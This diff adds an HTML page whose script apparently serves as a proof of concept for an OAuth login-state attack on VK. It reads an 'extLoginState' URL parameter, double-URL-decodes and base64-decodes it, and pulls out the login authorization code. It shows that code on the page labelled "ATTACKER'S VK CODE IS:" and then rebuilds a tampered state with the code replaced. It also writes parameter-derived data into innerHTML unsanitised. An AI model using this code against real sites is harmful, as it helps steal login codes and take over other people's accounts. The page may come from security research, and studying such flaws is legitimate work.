@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Document</title>
+</head>
+<body>
+	<p id="demo"></p>
+
+	<script>
+		const urlParams = new URLSearchParams(window.location.search);
+		const myParam = urlParams.get('extLoginState');
+		
+	
+		// Define the string
+		var string = myParam;
+	
+	
+		var decodedURL1 = decodeURIComponent(string);
+		var decodedURL2 = decodeURIComponent(decodedURL1);
+		console.log(decodedURL2)
+	
+		// Decode the String
+		var decodedBASE64 = atob(decodedURL2);
+	
+		console.log(decodedBASE64);
+	
+	
+	
+	
+		var ultimoArray = JSON.parse(decodedBASE64);
+		var ultimoArray2 = ultimoArray['code'];
+		ultimoArray.code = 'abcd'
+		console.log(ultimoArray)
+	
+	
+		document.getElementById("demo").innerHTML = "ATTACKER'S VK CODE IS:     "+ultimoArray2;
+
+
+		
+		var encodedBASE64 = btoa(decodedBASE64);
+		console.log(encodedBASE64);
+	
+		var encodedURL1 = encodeURIComponent(encodedBASE64);
+		var encodedURL2 = encodeURIComponent(encodedURL1);
+		console.log(encodedURL2)
+	
+	
+
+	</script>
+
+</body>
+</html>
